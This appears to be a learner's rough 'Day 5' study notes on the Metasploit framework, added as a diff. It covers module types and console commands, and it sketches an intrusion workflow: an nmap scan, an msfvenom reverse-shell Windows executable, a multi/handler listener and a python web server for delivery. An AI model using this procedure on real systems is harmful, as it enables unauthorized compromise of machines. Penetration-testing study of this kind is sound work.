@@ -1,0 +1,60 @@
+Day 5
+Metasploit framework
+
+start - msfconsole
+ exploits - for exploits 
+ auxiliary - for recosnance 
+ post for post exploits 
+ payloadss for implemente payload
+ encoder - for encoding 
+ nops - not much know
+ evasion - antivirus evade
+
+ show evasion for evasion modules
+ search command for particular thing
+ like vsftpd
+
+ search with particular type - search type:name
+
+ info command for info for any tool
+
+ show targets for targets tools
+
+ and show payloads for payloads tool 
+
+
+
+search type auxiliary :-
+use command for use
+option for option 
+
+msfvenom
+for making payloads 
+grep for specific device
+
+inbuilt listenenr - multi/handler
+
+
+:- Exploits with Metasploit
+
+nmap -sS -sV ip adr for scanning
+msfconsole -
+search open port
+use 
+options
+set rhosts ip adr 
+exploits
+
+:- make payload for compromise system 
+msfvenom -p windows/shell_reverse_tcp lhost lport  -f exe -o name
+
+msfconsole 
+use exploit multi/handler
+then set pay load
+set rhost
+python3 -m http.server 
+
+if connect
+sysinfo
+help
+use tools
